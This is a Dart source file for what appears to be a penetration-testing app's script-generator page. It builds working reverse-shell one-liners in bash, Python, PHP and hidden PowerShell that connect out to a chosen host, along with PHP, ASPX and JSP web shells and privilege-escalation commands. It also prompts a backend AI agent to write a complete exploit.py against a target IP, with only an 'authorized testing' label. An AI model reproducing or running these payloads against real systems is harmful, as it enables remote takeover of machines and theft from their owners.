import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../../services/secure_storage_service.dart';
import '../../../payload_chat/domain/entities/chat_message.dart';
import '../../../payload_chat/domain/repositories/payload_repository.dart';

enum ScriptStatus { idle, loading, success, error }

/// Generator options for the One-Liner tab.
enum OneLinerCategory { reverseShell, webShell, privesc }

/// Controller for the Script Generator page (One-Liner + Custom Python Builder).
class ScriptGenController extends StateNotifier<ScriptGenState> {
  ScriptGenController(this._repository, this._storage)
      : super(const ScriptGenState());

  final PayloadRepository _repository;
  final SecureStorageService _storage;
  bool _disposed = false;

  @override
  void dispose() {
    _disposed = true;
    super.dispose();
  }

  void setCategory(OneLinerCategory c) => state = state.copyWith(category: c);
  void setType(String t) => state = state.copyWith(type: t);
  void setIp(String v) => state = state.copyWith(ip: v);
  void setPort(String v) => state = state.copyWith(port: v);

  void setBuildIp(String v) => state = state.copyWith(buildIp: v);
  void setBuildPort(String v) => state = state.copyWith(buildPort: v);
  void setBuildPath(String v) => state = state.copyWith(buildPath: v);
  void setBuildPayloadType(String v) =>
      state = state.copyWith(buildPayloadType: v);

  /// Produce a deterministic one-liner based on the current selection.
  void buildOneLiner() {
    if (_disposed) return;
    final s = state;
    final ip = s.ip.trim().isEmpty ? '10.10.14.8' : s.ip.trim();
    final port = s.port.trim().isEmpty ? '9001' : s.port.trim();

    String out;
    switch (s.category) {
      case OneLinerCategory.reverseShell:
        out = _reverseShell(s.type, ip, port);
      case OneLinerCategory.webShell:
        out = _webShell(s.type);
      case OneLinerCategory.privesc:
        out = _privesc(s.type);
    }
    state = state.copyWith(generated: out);
  }

  String _reverseShell(String type, String ip, String port) {
    switch (type) {
      case 'bash':
        return 'bash -i >& /dev/tcp/$ip/$port 0>&1';
      case 'python':
        return 'python3 -c \'import socket,os,pty;s=socket.socket();'
            's.connect(("$ip",$port));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")\'';
      case 'php':
        return 'php -r \'\\\$s=fsockopen("$ip",$port);exec("/bin/sh -i <&3 >&3 2>&3");\'';
      case 'powershell':
        return 'powershell -nop -w hidden -c "\$c=New-Object System.Net.Sockets.TCPClient(\'$ip\',$port);'
            '\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){'
            '\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);'
            '\$sb=(iex \$d 2>&1|Out-String);\$s.Write((\$sb+\'PS \'+(pwd).Path+\'> \'|%{[text.encoding]::ASCII.GetBytes(\$_)}),0,\$_1);\$s.Flush()};\$c.Close()"';
      default:
        return 'bash -i >& /dev/tcp/$ip/$port 0>&1';
    }
  }

  String _webShell(String type) {
    switch (type) {
      case 'aspx':
        return '<%@ Page Language="C#" %>\n<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["c"]); %>';
      case 'jsp':
        return '<% Runtime.getRuntime().exec(request.getParameter("c")); %>';
      default: // php
        return '<?php system(\\\$_GET["c"]); ?>';
    }
  }

  String _privesc(String type) {
    switch (type) {
      case 'find':
        return 'find . -exec /bin/sh -p \\; -quit';
      case 'vim':
        return 'vim -c \':! /bin/sh\'';
      case 'python':
        return 'python3 -c \'import os;os.setuid(0);os.system("/bin/sh")\'';
      default:
        return 'sudo -l\nsudo python3 -c \'import os;os.setuid(0);os.system("/bin/sh")\'';
    }
  }

  /// Ask the backend agent to design a full exploit.py for the given params.
  Future<void> buildPythonExploit() async {
    if (_disposed) return;
    final s = state;
    final ip = s.buildIp.trim();
    final port = s.buildPort.trim();
    final path = s.buildPath.trim();
    final ptype = s.buildPayloadType;
    if (ip.isEmpty || port.isEmpty) {
      state = state.copyWith(
          pyStatus: ScriptStatus.error,
          pyError: 'Target IP and Port are required.');
      return;
    }

    state = state.copyWith(
        pyStatus: ScriptStatus.loading, pyResult: null, pyError: null);
    try {
      final lhost = await _storage.readDefaultLhost();
      final lport = await _storage.readDefaultLport();
      final prompt =
          'Write a single-file exploit.py using requests/pwntools to '
          'attack target=$ip on port=$port vulnerable_path=$path '
          'payload_type=$ptype. Include a main() and clear comments. '
          'Authorized testing only.';
      final result = await _repository.execute(
        PayloadRequest(
          prompt: prompt,
          target: ip,
          scanData: path.isEmpty ? null : 'vulnerable_path=$path',
          lhost: lhost,
          lport: lport,
        ),
      );
      if (_disposed) return;
      state = state.copyWith(pyStatus: ScriptStatus.success, pyResult: result);
    } catch (e) {
      if (_disposed) return;
      state =
          state.copyWith(pyStatus: ScriptStatus.error, pyError: e.toString());
    }
  }
}

class ScriptGenState {
  const ScriptGenState({
    this.category = OneLinerCategory.reverseShell,
    this.type = 'bash',
    this.ip = '',
    this.port = '',
    this.generated = '',
    this.buildIp = '',
    this.buildPort = '',
    this.buildPath = '',
    this.buildPayloadType = 'Reverse Shell',
    this.pyStatus = ScriptStatus.idle,
    this.pyResult,
    this.pyError,
  });

  final OneLinerCategory category;
  final String type;
  final String ip;
  final String port;
  final String generated;
  final String buildIp;
  final String buildPort;
  final String buildPath;
  final String buildPayloadType;
  final ScriptStatus pyStatus;
  final ChatMessage? pyResult;
  final String? pyError;

  List<String> get typeOptions {
    switch (category) {
      case OneLinerCategory.reverseShell:
        return const ['bash', 'python', 'php', 'powershell'];
      case OneLinerCategory.webShell:
        return const ['php', 'aspx', 'jsp'];
      case OneLinerCategory.privesc:
        return const ['sudo-python', 'find', 'vim', 'python'];
    }
  }

  ScriptGenState copyWith({
    OneLinerCategory? category,
    String? type,
    String? ip,
    String? port,
    String? generated,
    bool clearGenerated = false,
    String? buildIp,
    String? buildPort,
    String? buildPath,
    String? buildPayloadType,
    ScriptStatus? pyStatus,
    ChatMessage? pyResult,
    String? pyError,
  }) {
    return ScriptGenState(
      category: category ?? this.category,
      type: type ?? this.type,
      ip: ip ?? this.ip,
      port: port ?? this.port,
      generated: clearGenerated ? '' : (generated ?? this.generated),
      buildIp: buildIp ?? this.buildIp,
      buildPort: buildPort ?? this.buildPort,
      buildPath: buildPath ?? this.buildPath,
      buildPayloadType: buildPayloadType ?? this.buildPayloadType,
      pyStatus: pyStatus ?? this.pyStatus,
      pyResult: pyResult ?? this.pyResult,
      pyError: pyError ?? this.pyError,
    );
  }
}
